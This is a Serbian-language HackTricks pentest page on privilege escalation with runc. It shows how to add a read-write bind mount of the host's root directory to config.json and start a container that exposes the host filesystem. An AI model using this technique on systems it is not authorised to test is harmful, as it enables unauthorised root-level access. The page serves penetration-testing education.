# Privilege Escalation pomoću RunC

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Ako želite da saznate više o **runc**, pogledajte sledeću stranicu:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ako utvrdite da je `runc` instaliran na hostu, možda ćete moći da **pokrenete container koji mountuje root / folder hosta**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Ovo neće uvek funkcionisati jer je podrazumevana operacija runc-a pokretanje kao root, tako da pokretanje kao korisnik bez privilegija jednostavno ne može da funkcioniše (osim ako imate rootless konfiguraciju). Postavljanje rootless konfiguracije kao podrazumevane opcije uglavnom nije dobra ideja jer unutar rootless containera postoji prilično ograničenja koja se ne primenjuju izvan rootless containera.

{{#include ../../banners/hacktricks-training.md}}
